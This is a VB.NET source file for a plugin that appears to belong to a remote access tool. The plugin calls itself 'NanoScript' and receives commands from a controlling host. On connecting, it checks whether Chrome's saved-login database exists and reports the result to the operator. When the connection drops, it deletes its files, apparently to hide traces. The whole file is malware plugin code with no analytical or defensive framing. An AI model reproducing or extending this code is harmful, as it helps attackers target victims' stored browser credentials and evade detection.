Option Strict Off
Imports System.Windows.Forms
Imports System.Threading
Imports System.IO
Imports System.Text

Public Class ClientPlugin
    Implements IClientNetwork



    Sub New(_networkhost As IClientNetworkHost, _loggingHost As IClientLoggingHost)

        NetworkHost = _networkhost
        LoggingHost = _loggingHost
        InitializePlugin()

    End Sub

#Region " IClientNetwork "

    Public Sub BuildingHostCache() Implements IClientNetwork.BuildingHostCache

    End Sub

    Public Sub HostConnectFailed(host As String, port As UShort) Implements IClientNetwork.ConnectionFailed

    End Sub

    Public Sub HostStateChanged(connected As Boolean) Implements IClientNetwork.ConnectionStateChanged
        If connected = True Then
            Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Google\Chrome\User Data\Default\Login Data"
            If File.Exists(datapath) Then
                UpdateColumn("Chrome", "True")
            Else
                UpdateColumn("Chrome", "False")
            End If
        Else
            Try
                WriteLog("[NanoScript] Connection to host has been lost, NanoScript will now remove all unwanted files.")
                RemoveFiles()
            Catch ex As Exception
                WriteError(ex, "Removing files")
            End Try
        End If
    End Sub

    Public Sub PipeCreated(pipeName As String) Implements IClientNetwork.PipeCreated

    End Sub

    Public Sub PipeDestroyed(pipeName As String) Implements IClientNetwork.PipeClosed

    End Sub

    Public Sub ReadPacket(pipeName As String, params() As Object) Implements IClientNetwork.ReadPacket
        Select Case DirectCast(params(0), CommandType)
            Case CommandType.MiscCommand
                HandleMiscCommand(params)
            Case CommandType.comSST
                HandlecomSST(params)
        End Select
    End Sub
#End Region
End Class
